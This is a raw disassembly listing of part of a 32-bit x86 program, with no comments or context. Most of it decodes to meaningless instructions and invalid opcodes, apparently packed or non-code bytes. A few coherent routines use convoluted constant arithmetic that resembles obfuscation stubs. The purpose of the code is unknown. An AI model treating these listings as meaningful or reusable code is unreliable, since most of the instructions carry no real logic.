  41570f:	xor    BYTE PTR [esi],ah
  415711:	cmp    eax,0x852c7c1a
  415716:	into   
  415717:	popa   
  415718:	xchg   DWORD PTR [ebx],ecx
  41571a:	sbb    DWORD PTR [edx],edx
  41571c:	outs   dx,DWORD PTR ds:[esi]
  41571d:	jb     0x415784
  41571f:	pop    esp
  415720:	or     al,0x7
  415722:	jb     0x4156c0
  415724:	sub    BYTE PTR [esi+eax*4-0x63709260],ch
  41572b:	jge    0x4156f2
  41572d:	jmp    0x41571f
  41572f:	pop    edi
  415730:	loopne 0x41571f
  415732:	test   dh,bl
  415734:	jnp    0x41573f
  415736:	mov    ecx,0x1979e500
  41573b:	mov    ah,0x10
  41573d:	adc    al,0x3d
  41573f:	shl    DWORD PTR [edx],cl
  415741:	mov    es,WORD PTR [ecx+0x167687ee]
  415747:	lods   al,BYTE PTR ds:[esi]
  415748:	lea    edi,[edi+0xd9be710]
  41574e:	jae    0x4157aa
  415750:	add    DWORD PTR [ebx+ecx*8+0x6],ebp
  415754:	sbb    DWORD PTR [ebp-0x80],ebx
  415757:	aad    0x3f
  415759:	xchg   ebp,eax
  41575a:	xchg   ecx,eax
  41575b:	sub    bh,BYTE PTR [ebx+0xa7b40eb]
  415761:	sub    al,0xa9
  415763:	(bad)  
  415764:	jns    0x4156fe
  415766:	adc    cl,BYTE PTR [edx+0x4c]
  415769:	add    BYTE PTR [edx-0x3],dh
  41576c:	fdivr  QWORD PTR [eax+0x10c180ca]
  415772:	xor    BYTE PTR [esi],bh
  415774:	loop   0x415758
  415776:	cmp    al,0x59
  415778:	inc    esi
  415779:	mov    dh,0xf0
  41577b:	out    dx,eax
  41577c:	(bad)  
  41577d:	sbb    al,0xd5
  41577f:	cmp    cl,BYTE PTR [esi]
  415781:	or     eax,0xb7d8f1c3
  415786:	fadd   QWORD PTR [edi+0x3]
  415789:	push   ss
  41578a:	je     0x415802
  41578c:	add    al,0xe7
  41578e:	jl     0x41571b
  415790:	out    0x1c,eax
  415792:	ds into 
  415794:	sub    al,0x7a
  415796:	push   esp
  415797:	mov    ds:0xbc6e21f4,eax
  41579c:	(bad)  
  41579d:	iret   
  41579e:	sub    cl,BYTE PTR [ecx]
  4157a0:	or     DWORD PTR [ecx],esi
  4157a2:	fistp  DWORD PTR [eax-0x75527a71]
  4157a8:	stos   BYTE PTR es:[edi],al
  4157a9:	jns    0x9c3da09a
  4157af:	jge    0x4157ba
  4157b1:	mov    edx,0xa55eaacb
  4157b6:	inc    esp
  4157b7:	adc    esp,esp
  4157b9:	(bad)  
  4157ba:	(bad)  
  4157bb:	daa    
  4157bc:	jo     0x415763
  4157be:	icebp  
  4157bf:	cmp    eax,0x4cdad333
  4157c4:	jae    0x415800
  4157c6:	cdq    
  4157c7:	idiv   ah
  4157c9:	fwait
  4157ca:	aaa    
  4157cb:	dec    eax
  4157cc:	jmp    0x40fd:0x677db60b
  4157d3:	sbb    al,0xaa
  4157d5:	mov    esi,0x3ea1f015
  4157da:	rol    BYTE PTR [ecx-0x501a8cea],cl
  4157e0:	push   0x28a9cb7e
  4157e5:	lods   eax,DWORD PTR ds:[esi]
  4157e6:	xor    eax,0x8a5e7483
  4157eb:	inc    edi
  4157ec:	cs mov al,0x3f
  4157ef:	(bad)
  4157f3:	sahf   
  4157f4:	test   ah,al
  4157f6:	enterw 0xd1ff,0x48
  4157fb:	pushf  
  4157fc:	pop    ss
  4157fd:	loopne 0x41583d
  4157ff:	sub    cl,BYTE PTR [ecx+0x9]
  415802:	fnstsw ax
  415804:	rcr    DWORD PTR [esi-0x51929de1],cl
  41580a:	dec    ebx
  41580b:	sbb    al,0xca
  41580d:	or     DWORD PTR [ebp+0x48f3a32],edx
  415813:	push   ds
  415814:	daa    
  415815:	jle    0x415829
  415817:	stos   BYTE PTR es:[edi],al
  415818:	inc    esp
  415819:	xchg   DWORD PTR ds:0xea340ef5,ecx
  41581f:	js     0x4157c7
  415821:	mov    ebp,DWORD PTR [edx+0x1eb8f51e]
  415827:	inc    eax
  415828:	sub    ebx,DWORD PTR [esi+edi*8-0x4152ca51]
  41582f:	adc    BYTE PTR [edi+eiz*1],bh
  415832:	inc    edi
  415833:	jnp    0x4157c9
  415835:	sbb    al,0x88
  415837:	in     eax,0x9e
  415839:	jle    0x4157e7
  41583b:	aaa    
  41583c:	hlt    
  41583d:	ffree  st(4)
  41583f:	push   cs
  415840:	test   edi,ebx
  415842:	sbb    eax,0x43663720
  415847:	test   BYTE PTR [edx-0x62e24e8a],ch
  41584d:	sbb    cl,bl
  41584f:	push   esi
  415850:	sub    eax,0xb75dccd2
  415855:	adc    edi,DWORD PTR [ebx+ebp*2]
  415858:	pop    esi
  415859:	adc    bh,BYTE PTR [esi-0x38716eef]
  41585f:	retf   0x9c94
  415862:	or     eax,0xb3beab2a
  415867:	mov    ah,0x4
  415869:	and    DWORD PTR [ebx+0x1a2cb4a5],0xdc17a76f
  415873:	lds    esi,FWORD PTR [ebx]
  415875:	out    dx,eax
  415876:	retf   0xde74
  415879:	and    al,0xaf
  41587b:	push   ebp
  41587c:	xchg   esp,eax
  41587d:	nop
  41587e:	mov    ds:0x6b7701ef,al
  415883:	add    BYTE PTR [edx],0x81
  415886:	mov    DWORD PTR [edi-0x46],ecx
  415889:	and    BYTE PTR [ebx+0x40],dh
  41588c:	mov    eax,0x18202bb9
  415891:	(bad)  
  415892:	xor    al,0xda
  415894:	jmp    0x174b:0xeaa7cca5
  41589b:	jne    0x4158ab
  41589d:	call   ebp
  41589f:	mov    ebp,0xf191ea02
  4158a4:	ret    
  4158a5:	in     al,0x26
  4158a7:	cld    
  4158a8:	(bad)  
  4158a9:	or     eax,edx
  4158ab:	push   0x1
  4158ad:	add    eax,edi
  4158af:	push   eax
  4158b0:	lea    eax,[ebp-0x13]
  4158b3:	push   eax
  4158b4:	shl    ecx,0x1e
  4158b7:	call   0x411c08
  4158bc:	mov    eax,DWORD PTR [ebp+0x10]
  4158bf:	mov    ecx,DWORD PTR [ebp+0x14]
  4158c2:	shrd   eax,ecx,0x2
  4158c6:	shr    ecx,0x2
  4158c9:	mov    ecx,DWORD PTR [ebp+0x10]
  4158cc:	mov    edx,DWORD PTR [ebp+0x14]
  4158cf:	xor    eax,esi
  4158d1:	xor    edx,edx
  4158d3:	or     eax,edx
  4158d5:	add    eax,edi
  4158d7:	push   0x1
  4158d9:	push   eax
  4158da:	mov    eax,DWORD PTR [ebp+0x8]
  4158dd:	shl    ecx,0x1e
  4158e0:	mov    ecx,DWORD PTR [ebp+0xc]
  4158e3:	shrd   eax,ecx,0x2
  4158e7:	shr    ecx,0x2
  4158ea:	mov    ecx,DWORD PTR [ebp+0x8]
  4158ed:	mov    edx,DWORD PTR [ebp+0xc]
  4158f0:	xor    eax,esi
  4158f2:	xor    edx,edx
  4158f4:	or     eax,edx
  4158f6:	add    eax,edi
  4158f8:	push   eax
  4158f9:	shl    ecx,0x1e
  4158fc:	call   0x411c08
  415901:	push   0x1
  415903:	lea    eax,[ebp-0x13]
  415906:	push   eax
  415907:	mov    eax,DWORD PTR [ebp+0x10]
  41590a:	mov    ecx,DWORD PTR [ebp+0x14]
  41590d:	shrd   eax,ecx,0x2
  415911:	shr    ecx,0x2
  415914:	mov    ecx,DWORD PTR [ebp+0x10]
  415917:	mov    edx,DWORD PTR [ebp+0x14]
  41591a:	xor    eax,esi
  41591c:	xor    edx,edx
  41591e:	or     eax,edx
  415920:	add    eax,edi
  415922:	push   eax
  415923:	shl    ecx,0x1e
  415926:	call   0x411c08
  41592b:	mov    eax,DWORD PTR [ebp+0x10]
  41592e:	mov    ecx,DWORD PTR [ebp+0x14]
  415931:	shrd   eax,ecx,0x2
  415935:	shr    ecx,0x2
  415938:	mov    ecx,DWORD PTR [ebp+0x10]
  41593b:	mov    edx,DWORD PTR [ebp+0x14]
  41593e:	pop    edi
  41593f:	xor    eax,esi
  415941:	xor    edx,edx
  415943:	pop    esi
  415944:	shl    ecx,0x1e
  415947:	or     eax,edx
  415949:	pop    ebx
  41594a:	leave  
  41594b:	ret    0x10
  41594e:	mov    eax,DWORD PTR [esp+0x8]
  415952:	or     DWORD PTR ds:0x428465,0x7249
  41595c:	mov    ecx,DWORD PTR [esp+0x10]
  415960:	or     ecx,eax
  415962:	mov    DWORD PTR ds:0x428501,0x6956
  41596c:	mov    ecx,DWORD PTR [esp+0xc]
  415970:	jne    0x4159ee
  415976:	cmp    DWORD PTR ds:0x4283d5,0x0
  41597d:	mov    DWORD PTR ds:0x4284f5,0x1bde
  415987:	mov    DWORD PTR ds:0x428419,0x1ea7
  415991:	jmp    0x4159e5
  415996:	mov    eax,0x417c
  41599b:	mov    DWORD PTR ds:0x428521,ebx
  4159a1:	cmp    DWORD PTR ds:0x4283d5,0x0
  4159a8:	jne    0x4159d1
  4159ae:	push   DWORD PTR [ebp-0x28]
  4159b1:	call   DWORD PTR ds:0x42e0e0
  4159b7:	adc    DWORD PTR ds:0x428465,0x4283a9
  4159c1:	sub    DWORD PTR ds:0x4283dd,0x428499
  4159cb:	and    DWORD PTR ds:0x4283f5,edi
  4159d1:	mov    DWORD PTR ds:0x42840d,0x6bfe
  4159db:	adc    DWORD PTR ds:0x42847d,0x437a
  4159e5:	mov    eax,DWORD PTR [esp+0x4]
  4159e9:	mul    ecx
  4159eb:	ret    0x10
  4159ee:	push   ebx
  4159ef:	mul    ecx
  4159f1:	mov    ebx,eax
  4159f3:	mov    eax,DWORD PTR [esp+0x8]
  4159f7:	mul    DWORD PTR [esp+0x14]
  4159fb:	add    ebx,eax
  4159fd:	mov    eax,DWORD PTR [esp+0x8]
  415a01:	mul    ecx
  415a03:	add    edx,ebx
  415a05:	pop    ebx
  415a06:	ret    0x10
  415a09:	push   ebp
  415a0a:	mov    ebp,esp
  415a0c:	sub    esp,0x44
  415a0f:	push   ebx
  415a10:	push   esi
  415a11:	push   edi
  415a12:	mov    DWORD PTR [ebp-0x18],0x2
  415a19:	mov    DWORD PTR [ebp-0x14],0x29f0
  415a20:	mov    DWORD PTR [ebp-0x10],0x3716
  415a27:	mov    DWORD PTR [ebp-0x2c],0x4e09
  415a2e:	mov    DWORD PTR [ebp-0x28],0x4497
  415a35:	mov    DWORD PTR [ebp-0x24],0x5
  415a3c:	mov    DWORD PTR [ebp-0x20],0x2a0a
  415a43:	mov    DWORD PTR [ebp-0x1c],0x1
  415a4a:	mov    DWORD PTR [ebp-0xc],0xce6
  415a51:	mov    DWORD PTR [ebp-0x8],0x12b3
  415a58:	mov    DWORD PTR [ebp-0x4],0xb09
  415a5f:	mov    DWORD PTR [ebp-0x44],0x7617
  415a66:	mov    DWORD PTR [ebp-0x40],0x721a
  415a6d:	mov    DWORD PTR [ebp-0x3c],0x5151
  415a74:	mov    DWORD PTR [ebp-0x38],0x14aa
  415a7b:	mov    DWORD PTR [ebp-0x34],0x5a28
  415a82:	mov    DWORD PTR [ebp-0x30],0x19a8
  415a89:	mov    ecx,DWORD PTR [ebp-0x1c]
  415a8c:	mov    eax,DWORD PTR [ebp-0x20]
  415a8f:	xor    edx,edx
  415a91:	div    ecx
  415a93:	mov    ecx,DWORD PTR [ebp-0x24]
  415a96:	xor    edx,edx
  415a98:	mov    esi,0x1ac5
  415a9d:	push   0x20
  415a9f:	div    ecx
  415aa1:	mov    ecx,DWORD PTR [ebp-0x28]
  415aa4:	xor    edx,edx
  415aa6:	xor    eax,0x60dc
  415aab:	sub    eax,ecx
  415aad:	mov    ecx,DWORD PTR [ebp-0x2c]
  415ab0:	lea    edi,[eax+ecx*1-0x6300]
  415ab7:	mov    eax,DWORD PTR [ebp-0x4]
  415aba:	mov    ecx,DWORD PTR [ebp-0x8]
  415abd:	sub    eax,0x7721
  415ac2:	xor    eax,ecx
  415ac4:	mov    ecx,DWORD PTR [ebp-0xc]
  415ac7:	xor    eax,ecx
  415ac9:	or     eax,0x7bc9
  415ace:	xor    eax,0xfffff0db
  415ad3:	mov    ebx,edi
  415ad5:	sub    ebx,eax
  415ad7:	mov    eax,DWORD PTR [ebp-0x10]
  415ada:	mov    ecx,DWORD PTR [ebp-0x14]
  415add:	xor    eax,ecx
  415adf:	mov    ecx,DWORD PTR [ebp-0x18]
  415ae2:	sub    eax,esi
  415ae4:	div    ecx
  415ae6:	mov    ecx,0x211
  415aeb:	pop    edx
  415aec:	xor    eax,ecx
  415aee:	jmp    0x415ef7
  415af3:	push   ds
  415af4:	inc    ecx
  415af5:	cmp    edi,esi
  415af7:	mov    edx,0x9f9c24b7
  415afc:	push   ecx
  415afd:	mov    ebp,0x34dc23cf
  415b02:	fstp   QWORD PTR [esp+edi*4-0x3b714142]
  415b09:	mov    esi,0x92047dbe
  415b0e:	mov    WORD PTR [eax],?
  415b10:	xor    eax,0x395cadcb
  415b15:	and    al,0x1b
  415b17:	mov    esp,DWORD PTR [esi]
  415b19:	dec    esi
  415b1a:	(bad)  
  415b1b:	xor    eax,0xbfd26313
  415b20:	xor    BYTE PTR ds:[esi+esi*8],ah
  415b24:	daa    
  415b25:	dec    edx
  415b26:	inc    edi
  415b27:	sub    cl,ah
  415b29:	ds adc bh,0x6a
  415b2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b2e:	mov    edi,0x188c5c
  415b33:	xchg   BYTE PTR [esi+0xd],bl
  415b36:	push   cs
  415b37:	jp     0x415b52
  415b39:	sti    
  415b3a:	jg     0x415b00
  415b3c:	dec    esp
  415b3d:	cwde   
  415b3e:	pop    esi
  415b3f:	lods   eax,DWORD PTR ds:[esi]
  415b40:	inc    ecx
  415b41:	test   BYTE PTR [ebp+0x3f24088],ch
  415b47:	dec    ebp
  415b48:	xor    al,0x32
  415b4a:	(bad)  
  415b4b:	xchg   edi,eax
  415b4c:	rcr    BYTE PTR [ebx+0x52672e85],1
  415b52:	xor    al,0xec
  415b54:	jb     0x415afe
  415b56:	loop   0x415bbc
  415b58:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b5a:	cmp    cl,BYTE PTR [eax+eiz*8-0x3ab13e44]
  415b61:	inc    esp
  415b62:	mov    ds:0x1d14ffbc,eax
  415b67:	adc    eax,0x1a4d0773
  415b6c:	jg     0x415bcc
  415b6e:	or     DWORD PTR [ebp-0x77b296db],0xffffffb0
  415b75:	jo     0x415ba9
  415b77:	or     eax,esp
  415b79:	idiv   eax
  415b7b:	pusha  
  415b7c:	(bad)  
  415b7d:	cmp    dl,BYTE PTR [ebx+0x5e]
  415b80:	pop    ds
  415b81:	jo     0x415b64
  415b83:	push   ss
  415b84:	test   BYTE PTR [ebx],bh
  415b86:	pushf  
  415b87:	inc    esp
  415b88:	addr16 pop ss
  415b8a:	sub    eax,0x3f935637
  415b8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b90:	xor    eax,0x4b779b8e
  415b95:	fstp   QWORD PTR [eax+0x71198a15]
  415b9b:	scas   al,BYTE PTR es:[edi]
  415b9c:	mov    BYTE PTR [edi-0x4995f79a],al
  415ba2:	push   es
  415ba3:	dec    ecx
  415ba4:	cli    
  415ba5:	daa    
  415ba6:	mov    ecx,0xb9554467
  415bab:	enter  0x728e,0xf5
  415baf:	test   eax,0xc2fed0e7
  415bb4:	loope  0x415c0a
  415bb6:	push   0x2e
  415bb8:	cmp    al,0x7d
  415bba:	popf   
  415bbb:	xchg   BYTE PTR [esi+eax*1],dh
  415bbe:	push   ss
  415bbf:	mov    edx,0xf009aa01
  415bc4:	xchg   esp,eax
  415bc5:	and    eax,0xcd3857f1
  415bca:	xchg   ebp,esi
  415bcc:	mov    bl,0x7f
  415bce:	push   es
  415bcf:	sub    dl,bl
  415bd1:	inc    esi
  415bd2:	mov    al,0x3b
  415bd4:	popa   
  415bd5:	pop    ecx
  415bd6:	aaa    
  415bd7:	adc    cl,cl
  415bd9:	add    dh,BYTE PTR [eax]
  415bdb:	mov    eax,0x4d9f1130
  415be0:	xchg   ecx,eax
  415be1:	and    al,0x79
  415be3:	bound  edx,QWORD PTR [ebx]
  415be5:	xor    ebx,esi
  415be7:	test   al,0x70
  415be9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415bea:	mov    ah,0x6b
  415bec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bed:	xchg   ebx,eax
  415bee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415bef:	push   ebx
  415bf0:	ret    0xceab
  415bf3:	lods   al,BYTE PTR ds:[esi]
  415bf4:	hlt    
  415bf5:	dec    edx
  415bf6:	repz das 
  415bf8:	rol    BYTE PTR ds:0xd7172b48,cl
  415bfe:	sub    dl,dl
  415c00:	jae    0x415bc7
  415c02:	jo     0x415bb6
  415c04:	jg     0x415bd2
  415c06:	scas   eax,DWORD PTR es:[edi]
  415c07:	mov    al,0xc0
  415c09:	pop    esp
  415c0a:	pavgb  mm7,mm0
  415c0d:	and    DWORD PTR [ebp+edx*4-0x3f],0x8c6aa8d2
  415c15:	test   DWORD PTR [ebp+0xe],ecx
  415c18:	icebp  
  415c19:	out    0xe1,al
  415c1b:	pop    esi
  415c1c:	test   DWORD PTR [edx-0x3a],0xf818d7fc
  415c23:	push   edi
  415c25:	or     DWORD PTR [eax+ebx*2-0x28a3a3f0],0x15bf7b1a
  415c30:	add    eax,0xbc42f0ad
  415c35:	in     eax,0x40
  415c37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c38:	jns    0x415c76
  415c3a:	es das 
  415c3c:	stos   DWORD PTR es:[edi],eax
  415c3d:	shl    DWORD PTR [eax],1
  415c3f:	popf   
  415c40:	prefetchnta BYTE PTR [ecx+ebp*1]
  415c44:	pop    ss
  415c45:	and    cl,BYTE PTR [esi-0xc58fc5f]
  415c4b:	jg     0x415c27
  415c4d:	stos   DWORD PTR es:[edi],eax
  415c4e:	ins    BYTE PTR es:[edi],dx
  415c4f:	push   eax
  415c50:	mov    dh,0x14
  415c52:	inc    ebp
  415c53:	(bad)  
  415c54:	div    DWORD PTR [eax-0x30]
  415c57:	pop    eax
  415c58:	int3   
  415c59:	clc    
  415c5a:	jb     0x415c56
  415c5c:	mov    dl,0xa6
  415c5e:	cmp    bl,bh
  415c60:	aaa    
  415c61:	in     al,dx
  415c62:	sbb    BYTE PTR [esi],ch
  415c64:	mov    eax,0xc51e682f
  415c69:	je     0x415c56
  415c6b:	adc    cl,dh
  415c6d:	in     eax,dx
  415c6e:	mov    bh,0x66
  415c70:	rol    DWORD PTR [ebx-0x2f],0x41
  415c74:	loope  0x415c13
  415c76:	cli    
  415c77:	ins    DWORD PTR es:[edi],dx
  415c78:	cdq    
  415c79:	inc    edi
  415c7a:	pop    edi
  415c7b:	retf   
  415c7c:	idiv   DWORD PTR [esi+ebp*8+0x20e8ec2f]
  415c83:	cdq    
  415c84:	fld    QWORD PTR [edx+0x37]
  415c87:	ret    0x31a3
  415c8a:	mov    ds:0x25f8f36c,al
  415c8f:	sbb    eax,0x16334dc9
  415c94:	or     eax,DWORD PTR [ecx]
  415c96:	sub    DWORD PTR ds:0x1caa1b0e,esp
  415c9c:	out    dx,al
  415c9d:	das    
  415c9e:	repz xchg esp,eax
  415ca0:	ss lahf 
  415ca2:	outs   dx,DWORD PTR ds:[esi]
  415ca3:	push   ss
  415ca4:	cwde   
  415ca5:	test   eax,0xdcb37812
  415cab:	leave  
  415cac:	fadd   DWORD PTR [edx+0x21]
  415caf:	icebp  
  415cb0:	pop    esp
  415cb1:	sub    esi,esp
  415cb3:	adc    bl,BYTE PTR [edi+0x4e778f70]
  415cb9:	in     al,dx
  415cba:	mov    ?,WORD PTR [esi+0x1c0be015]
  415cc0:	lock mov dh,0x2d
  415cc3:	xlat   BYTE PTR ds:[ebx]
  415cc4:	pushf  
  415cc5:	icebp  
  415cc6:	and    BYTE PTR [eax],dl
  415cc8:	mov    eax,ds:0x5b6f3e76
  415ccd:	rcl    DWORD PTR [ebp+0x5de705ff],0xd1
  415cd4:	mov    ebp,0x7760ebe8
  415cd9:	xor    BYTE PTR [eax+0x2],dh
  415cdc:	js     0x415ce8
  415cde:	push   cs
  415cdf:	mov    bl,0xc8
  415ce1:	icebp  
  415ce2:	stos   DWORD PTR es:[edi],eax
  415ce3:	mov    ebp,0x98ca2a70
  415ce8:	adc    ch,BYTE PTR [eax]
  415cea:	mov    esi,0x95c539fb
  415cef:	and    eax,0xf11ad426
  415cf4:	or     ch,BYTE PTR [ebp-0x2ccdebe2]
  415cfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415cfb:	and    DWORD PTR [eax+0x72334425],eax
  415d01:	mov    esp,DWORD PTR ds:0x9c9cd7a5
  415d07:	add    eax,DWORD PTR [edi+0x6394db30]
  415d0d:	mov    gs:0xc90e43a0,eax
  415d13:	adc    al,0xa9
  415d15:	outs   dx,DWORD PTR ds:[esi]
  415d16:	aaa    
  415d17:	push   edx
  415d18:	je     0x415d91
  415d1a:	push   esp
  415d1b:	cld    
  415d1c:	ins    DWORD PTR es:[edi],dx
  415d1d:	daa    
  415d1e:	arpl   WORD PTR [edx-0x61e24a39],si
  415d24:	inc    edx
  415d25:	out    0x8,eax
  415d27:	ds hlt 
  415d29:	iret   
  415d2a:	add    BYTE PTR [edi+0x34],al
  415d2d:	fsubr  st(1),st
  415d2f:	add    eax,0xc467281a
  415d34:	push   0xffffff83
  415d36:	lock pop esi
  415d38:	or     al,0x8a
  415d3a:	iret   
  415d3b:	push   esi
  415d3c:	imul   ecx,DWORD PTR [ebx+0x60],0x2f
  415d40:	jle    0x415d48
  415d42:	pop    edi
  415d43:	push   esi
  415d44:	cmp    ebx,DWORD PTR gs:[edi+0x2694c1de]
  415d4b:	adc    BYTE PTR [edx],cl
  415d4d:	sbb    esp,0x24
  415d50:	xchg   esp,eax
  415d51:	mov    eax,ds:0xb4927531
  415d56:	cmp    BYTE PTR [esi-0x149cb8f9],0xfe
  415d5d:	jp     0x415d2d
  415d5f:	cli    
  415d60:	mov    dl,0x10
  415d62:	mov    al,0x52
  415d64:	mov    DWORD PTR [edi+0x4b48c14b],edi
  415d6a:	push   ss
  415d6b:	mov    bl,0x6f
  415d6d:	cmp    DWORD PTR [edi+0x6a16b4b3],esp
  415d73:	das    
  415d74:	mov    esi,es
  415d76:	add    BYTE PTR [eax+0x3f],cl
  415d79:	mov    dh,0xc5
  415d7b:	jmp    0xdeb3d09f
  415d80:	fsubrp st(1),st
  415d82:	call   0x49eb:0xcecdbc21
  415d89:	fbstp  TBYTE PTR [ebx]
  415d8b:	(bad)  
  415d8c:	xlat   BYTE PTR ds:[ebx]
  415d8d:	mov    eax,0xd82a7ea3
  415d92:	or     DWORD PTR [ecx+0x3826a3e8],esi
  415d98:	cdq    
  415d99:	mov    bl,0xcf
  415d9b:	dec    eax
  415d9c:	cld    
  415d9d:	loop   0x415d63
  415d9f:	fs out dx,al
  415da1:	mov    al,0xda
  415da3:	lock fs sub eax,0x5d5ed6be
  415daa:	xchg   esp,eax
  415dab:	cmc    
  415dac:	xlat   BYTE PTR ds:[ebx]
  415dad:	fdiv   DWORD PTR [edx+edx*2-0x11]
  415db1:	fisub  DWORD PTR [ebp+0xf]
  415db4:	int3   
  415db5:	mov    edx,0x19f12807
  415dba:	sub    edx,eax
  415dbc:	push   ecx
  415dbd:	out    0x71,al
  415dbf:	sti    
  415dc0:	call   0xbcde233a
  415dc5:	or     ah,BYTE PTR [edi-0x15]
  415dc8:	adc    al,0x28
  415dca:	ficom  DWORD PTR [esi-0x6e]
  415dcd:	stos   BYTE PTR es:[edi],al
  415dce:	sub    BYTE PTR [ebx+0x45],0xc5
  415dd2:	ret    0xef2c
  415dd5:	loop   0x415dfd
  415dd7:	mov    dl,0x2b
  415dd9:	mov    ds:0xc63c9c74,eax
  415dde:	aam    0x98
  415de0:	sub    al,0x14
  415de2:	pop    edx
  415de3:	adc    DWORD PTR [ebp-0x37cca594],ebp
  415de9:	xor    al,BYTE PTR [ebx]
  415deb:	retf   
  415dec:	xchg   DWORD PTR [edx],edx
  415dee:	leave  
  415def:	add    DWORD PTR [ecx-0x7593cf83],0x6e
  415df6:	mov    ebx,0x84337733
  415dfb:	loope  0x415dbf
  415dfd:	fstp   QWORD PTR [eax-0x64bf850a]
  415e03:	inc    DWORD PTR [ecx]
  415e05:	sbb    ebx,esp
  415e07:	mov    edi,0xc022c5f6
  415e0c:	pushf  
  415e0d:	imul   esi,esp,0x72
  415e10:	or     ebp,ecx
  415e12:	je     0x415e00
  415e14:	into   
  415e15:	sbb    ch,BYTE PTR ds:0xfac60306
  415e1b:	add    edx,DWORD PTR [edx-0x3e]
  415e1e:	(bad)  
  415e1f:	ret    0x5335
  415e22:	arpl   WORD PTR [ecx+0x1b],cx
  415e25:	add    bh,BYTE PTR [ebx+ebp*4+0x4f247325]
  415e2c:	std    
  415e2d:	out    dx,eax
  415e2e:	(bad)  
  415e2f:	or     bl,BYTE PTR [edi+0x54]
  415e32:	and    al,0x5
  415e34:	in     eax,0x75
  415e36:	test   BYTE PTR [edx+0x33b25894],bh
  415e3c:	mov    ds:0x69f076f4,eax
  415e41:	mov    dl,BYTE PTR ds:0xd3ac9d5f
  415e47:	mov    al,ds:0x68040003
  415e4c:	mov    BYTE PTR [ecx],al
  415e4e:	fsub   DWORD PTR ds:0x7b2bc4ac
  415e54:	mov    dl,BYTE PTR [edx]
  415e56:	jecxz  0x415ec7
  415e58:	fidivr DWORD PTR [ebp-0x5de68893]
  415e5e:	dec    edx
  415e5f:	add    DWORD PTR [edx+eiz*8],0xffffffd3
  415e63:	and    DWORD PTR fs:[ebx+0x25],ebp
  415e67:	ins    BYTE PTR es:[edi],dx
  415e68:	pop    ebx
  415e69:	fld    DWORD PTR [ebp+0x19e4d17b]
  415e6f:	ror    BYTE PTR [edx-0x6c],cl
  415e72:	jmp    0x650c05db
  415e77:	push   ss
  415e78:	inc    ebp
  415e79:	data16 cli 
  415e7b:	shl    BYTE PTR ss:[edx],1
  415e7e:	std    
  415e7f:	repnz xor ebp,DWORD PTR [edx]
  415e82:	jmp    0x905691e8
  415e87:	sbb    bl,ah
  415e89:	and    al,0x9e
  415e8b:	pusha  
  415e8c:	jl     0x415e73
  415e8e:	sub    BYTE PTR [edi+eax*4],bl
  415e91:	add    ah,BYTE PTR [edx-0x4d261eff]
  415e97:	mov    cl,0x6
  415e99:	mov    al,ss:0x36ed5f28
  415e9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ea0:	push   ebx
  415ea1:	xchg   al,dh
  415ea3:	ror    DWORD PTR [ebx],cl
  415ea5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ea6:	outs   dx,DWORD PTR ds:[esi]
  415ea7:	and    esi,DWORD PTR [ecx-0x3]
  415eaa:	dec    esp
  415eab:	pop    edi
  415eac:	jmp    0x415eca
  415eae:	or     bh,al
  415eb0:	addr16 icebp 
  415eb2:	scas   al,BYTE PTR es:[edi]
  415eb3:	xlat   BYTE PTR ds:[ebx]
  415eb4:	pop    ds
  415eb5:	sbb    BYTE PTR [eax-0x6d],0x3e
  415eb9:	scas   al,BYTE PTR es:[edi]
  415eba:	sbb    ah,BYTE PTR [edi]
  415ebc:	sahf   
  415ebd:	ins    DWORD PTR es:[edi],dx
  415ebe:	inc    ebx
  415ebf:	and    ebx,esp
  415ec1:	retf   
  415ec2:	out    dx,eax
  415ec3:	popf   
  415ec4:	std    
  415ec5:	out    dx,eax
  415ec6:	add    bl,bl
  415ec8:	sub    BYTE PTR [ecx-0x46e779b0],bh
  415ece:	xchg   ecx,eax
  415ecf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ed0:	loopne 0x415ef6
  415ed2:	xchg   edi,eax
  415ed3:	pop    edi
  415ed4:	sub    al,0xc5
  415ed6:	out    dx,eax
  415ed7:	inc    edx
  415ed8:	scas   eax,DWORD PTR es:[edi]
  415ed9:	push   esi
  415eda:	leave  
  415edb:	mov    bl,0x72
  415edd:	mov    ebp,0x6d6e3e7a
  415ee2:	adc    al,0xfc
  415ee4:	das    
  415ee5:	inc    ecx
  415ee6:	popa   
  415ee7:	lock popf 
  415ee9:	mov    esp,0xbe833f85
  415eee:	pop    edx
  415eef:	mov    ebp,0xe1d81895
  415ef4:	in     eax,dx
  415ef5:	lods   al,BYTE PTR ds:[esi]
  415ef6:	push   ebx
  415ef7:	sub    edx,eax
  415ef9:	cmp    ebx,edx
  415efb:	ja     0x4167d7
  415f01:	jmp    0x415f09
  415f06:	mov    edi,DWORD PTR [ebp-0x2c]
  415f09:	mov    DWORD PTR [ebp-0x20],0x1aa3
  415f10:	mov    DWORD PTR [ebp-0x24],0x52d
  415f17:	mov    DWORD PTR [ebp-0x28],0x226c
  415f1e:	jmp    0x416327
  415f23:	dec    eax
  415f24:	pop    edi
  415f25:	xor    ch,BYTE PTR [esi-0x48b34bc6]
  415f2b:	inc    edx
  415f2c:	imul   edx,edi,0x929bc1e3
  415f32:	nop
  415f33:	ins    BYTE PTR es:[edi],dx
  415f34:	(bad)  
  415f35:	sar    BYTE PTR [esi-0x41413b72],0x8
  415f3c:	call   FWORD PTR [edx+eax*8]
  415f3f:	add    DWORD PTR [eax],0xd8100880
  415f45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f46:	in     al,dx
  415f47:	std    
  415f48:	call   0x5212:0x75c3af88
  415f4f:	push   ss
  415f50:	and    eax,0xe8a8e31c
  415f55:	pop    ds
  415f56:	mov    edi,0x2f23bfb2
  415f5b:	outs   dx,DWORD PTR ds:[esi]
  415f5c:	push   ebx
  415f5d:	xor    BYTE PTR [esi-0x2d],bl
  415f60:	pop    ebp
  415f61:	mov    ecx,0x60d65cff
  415f66:	pushf  
